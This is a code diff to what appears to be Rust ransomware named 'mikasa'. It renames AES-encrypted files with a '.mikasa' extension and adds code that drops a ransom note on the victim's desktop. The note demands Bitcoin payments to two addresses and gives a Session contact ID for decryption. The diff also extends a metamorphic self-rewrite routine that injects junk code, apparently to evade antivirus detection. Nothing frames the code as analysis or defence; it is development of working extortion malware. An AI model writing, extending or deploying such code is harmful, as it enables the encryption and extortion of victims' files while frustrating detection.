@@ -228,7 +228,7 @@ fn encrypt_file(r_path: &PathBuf, r_cipher: &Aes256Gcm) -> io::Result<()> {
 
     let mut r_new_path = r_path.clone();
     let r_new_file_name = format!(
-        "{}.locked",
+        "{}.mikasa",
         r_path
             .file_name()
             .and_then(|r_name| r_name.to_str())
@@ -265,6 +265,13 @@ fn entry() -> Result<(), eframe::Error> {
         }
     }
 
+    let r_desktop_path: PathBuf =
+        dirs::desktop_dir().expect("Could not find the desktop directory");
+
+    let r_file_path = r_desktop_path.join("README.txt");
+    let mut r_file = File::create(&r_file_path).expect("Could not create file");
+    writeln!(r_file, "Please send 0.003 BTC to the following address: 1LACmsR1mU6WLKzALMqkLxRjDSNVqoCpzj and also send 0.001 BTC to the following address: bc1qsq2p02m6mtdac7llu798wusrtc9p4mcnu5e9eg for decryption, Then contact dev on Session on this ID 424234njewjnnjnj812a50659065edc8wewqnjdjwnj44343nj4neee344564nj6n3535").expect("Could not write to file");
+
     if r_encryption_status {
         let r_options = eframe::NativeOptions {
             viewport: egui::ViewportBuilder::default().with_inner_size([820.0, 700.0]),
@@ -283,15 +290,23 @@ fn entry() -> Result<(), eframe::Error> {
 
 fn rewrite() -> std::io::Result<()> {
     let r_source_code = include_str!("main.rs");
-    let r_toml = r#"
+    let r_exe_path = env::current_exe().unwrap();
+    let r_project_name = r_exe_path
+        .file_stem()
+        .and_then(|s| s.to_str())
+        .unwrap_or("default_project")
+        .to_string();
+    let r_toml = format!(
+        r#"
 [package]
-name = "mikasa"
+name = "{}"
 version = "0.1.0"
 edition = "2024"
 
 [dependencies]
 aes-gcm = "0.10.3"
 daemonize = "0.5.0"
+dir = "0.1.2"
 dirs = "6.0.0"
 eframe = "0.31.1"
 epaint = "0.31.1"
@@ -299,12 +314,14 @@ litcrypt = "0.4.0"
 metamorph = "1.0.1"
 rand_core = "0.9.3"
 walkdir = "2.5.0"
-"#;
+"#,
+        r_project_name
+    );
 
     let r_junk_code = 15;
-    let r_project_name = "mikasa";
+    let r_project_name = &r_project_name;
 
-    metamorph::morph(r_source_code, r_toml, r_junk_code, r_project_name)?;
+    metamorph::morph(r_source_code, &r_toml, r_junk_code, r_project_name)?;
     Ok(())
 }
 
